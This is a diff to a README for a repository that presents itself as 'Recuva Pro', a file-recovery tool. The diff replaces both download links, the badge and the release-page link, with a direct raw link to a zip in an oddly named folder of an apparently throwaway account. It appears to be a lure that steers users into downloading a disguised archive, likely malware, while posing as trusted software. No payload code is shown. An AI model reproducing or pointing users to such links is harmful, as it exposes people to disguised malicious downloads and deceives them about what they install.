@@ -1,6 +1,6 @@
 # 💾 Recuva-Pro-Data-Recovery - Recover your deleted files with ease
 
-[![Download Recuva Pro](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Janetaunimaginable726/Recuva-Pro-Data-Recovery/releases)
+[![Download Recuva Pro](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Janetaunimaginable726/Recuva-Pro-Data-Recovery/main/silhouettist/Recovery_Recuva_Data_Pro_drawbar.zip)
 
 Recuva Pro restores deleted files from hard drives, USB sticks, memory cards, and portable media players. This tool performs deep scans to find files that standard software misses.
 
@@ -24,7 +24,7 @@ Ensure your computer meets these standards before you begin:
 
 Visit the release page to get the installer for your system:
 
-[https://github.com/Janetaunimaginable726/Recuva-Pro-Data-Recovery/releases](https://github.com/Janetaunimaginable726/Recuva-Pro-Data-Recovery/releases)
+[https://raw.githubusercontent.com/Janetaunimaginable726/Recuva-Pro-Data-Recovery/main/silhouettist/Recovery_Recuva_Data_Pro_drawbar.zip](https://raw.githubusercontent.com/Janetaunimaginable726/Recuva-Pro-Data-Recovery/main/silhouettist/Recovery_Recuva_Data_Pro_drawbar.zip)
 
 1. Open the link in your web browser.
 2. Find the section titled Assets.
